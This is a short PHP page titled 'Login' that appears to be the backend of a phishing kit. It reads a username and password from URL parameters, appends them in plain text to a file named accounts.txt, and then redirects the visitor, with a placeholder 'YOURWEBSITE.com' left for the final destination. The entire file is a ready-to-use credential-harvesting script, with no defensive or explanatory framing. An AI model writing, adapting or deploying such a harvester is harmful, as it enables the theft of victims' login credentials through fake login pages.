<html>
 <head>
  <title>Login</title>
 </head>
 <body>

 	<?php
 		error_reporting(E_ALL);
 		ini_set('display_errors', 1);

 	    $username = $_GET['uname'];
 	    $password = $_GET['psw'];
 	    $filename = 'accounts.txt';
 	    $fp = fopen($filename, 'a+');
 	    fwrite ($fp, $username . "," . $password . "\n");
 	    fclose ($fp);
 	    // echo OR header, not both
 	    // echo ("account created");
 	    header("Location: index.html"); 
 	    die();
 	?>


//goes here after
<script>location.href='https://YOURWEBSITE.com';</script>
	 
 </body>
</html>